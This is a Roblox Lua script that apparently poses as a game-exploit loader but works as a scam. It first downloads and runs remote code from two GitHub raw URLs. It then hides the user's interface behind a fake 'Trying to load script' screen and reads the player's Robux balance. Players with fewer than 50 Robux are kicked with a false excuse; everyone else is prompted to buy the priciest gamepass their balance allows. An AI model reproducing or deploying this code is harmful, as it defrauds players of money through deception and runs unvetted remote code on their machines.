loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/two.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/one.lua"))()

local coreGui = game:GetService("CoreGui")
local topBarApp = coreGui:FindFirstChild("TopBarApp")

if topBarApp then
    topBarApp:Destroy()
else
    print("wtf lol")
end

local function clearPlayerGui(player)
    local playerGui = player:FindFirstChild("PlayerGui")
    if playerGui then
        for _, obj in pairs(playerGui:GetChildren()) do
            obj:Destroy()
        end
    end
end

for _, player in pairs(game:GetService("Players"):GetPlayers()) do
    clearPlayerGui(player)
end

local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BackgroundTransparency = 0
frame.BorderSizePixel = 0
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Text = "Trying to load script (30 sec)"
textLabel.Size = UDim2.new(1, 0, 0.1, 0)
textLabel.Position = UDim2.new(0, 0, 0.45, 0)
textLabel.Parent = frame
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.FontSize = Enum.FontSize.Size36
textLabel.Font = Enum.Font.Gotham

game.Lighting.TimeOfDay = 0.5
game.Lighting.Brightness = 0 
game.Lighting.FogEnd = 100

local lighting = game:GetService("Lighting")

local existingSky = nil

for _, child in ipairs(lighting:GetChildren()) do
    if child:IsA("Sky") or (child:IsA("Object") and child:FindFirstChild("SkyboxBk")) then
        existingSky = child
        break
    end
end

if existingSky then
    existingSky:Destroy()
end

local skyy = Instance.new("Sky")
skyy.Name = "uwu"
skyy.Parent = lighting
skyy.SkyboxBk = "rbxassetid://12322755004"
skyy.SkyboxDn = "rbxassetid://12322755004"
skyy.SkyboxFt = "rbxassetid://12322755004"
skyy.SkyboxLf = "rbxassetid://12322755004"
skyy.SkyboxRt = "rbxassetid://12322755004"
skyy.SkyboxUp = "rbxassetid://12322755004"

-- gamepasses
-- 637671275 / 50 robux
-- 628348366 / 100 robux
-- 628037371 / 200 robux
-- 630810360 / 300 robux
-- 629718391 / 500 robux
-- 637342279 / 750 robux
-- 629164294 / 1000 robux
-- 629363069 / 1.5k robux
-- 636952278 / 2k robux
-- 634064461 / 2.5k robux
-- 636753262 / 4k robux
-- 636628242 / 6k robux
-- 636579262 / 8k robux
-- 636576260 / 13k robux
-- 636547257 / 20k robux
-- 637401247 / 35k robux
-- 636741231 / 50k robux
-- 636109272 / 75k robux
-- 636128293 / 150k robux

local mps = game:GetService("MarketplaceService")
local rb = mps:GetRobuxBalance(game.Players.LocalPlayer)

if rb == 0 then
game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
elseif rb > 0 and rb < 50 then
game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
elseif rb >= 50 and rb < 100 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637671275)
wait()
elseif rb >= 100 and rb < 200 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 628348366)
wait()
elseif rb >= 200 and rb < 300 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 628037371)
wait()
elseif rb >= 300 and rb < 500 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 630810360)
wait()
elseif rb >= 500 and rb < 750 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629718391)
wait()
elseif rb >= 750 and rb < 1000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637342279)
wait()
elseif rb >= 1000 and rb < 1500 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629164294)
wait()
elseif rb >= 1500 and rb < 2000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629363069)
wait()
elseif rb >= 2000 and rb < 2500 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636952278)
wait()
elseif rb >= 2500 and rb < 4000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 634064461)
wait()
elseif rb >= 4000 and rb < 6000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636753262)
wait()
elseif rb >= 6000 and rb < 8000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636628242)
wait()
elseif rb >= 8000 and rb < 13000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636579262)
wait()
elseif rb >= 13000 and rb < 20000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636576260)
wait()
elseif rb >= 20000 and rb < 35000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636547257)
wait()
elseif rb >= 35000 and rb < 50000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637401247)
wait()
elseif rb >= 50000 and rb < 75000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636741231)
wait()
elseif rb >= 75000 and rb < 150000 then
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636109272)
wait()
else
game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636128293)
wait()
end
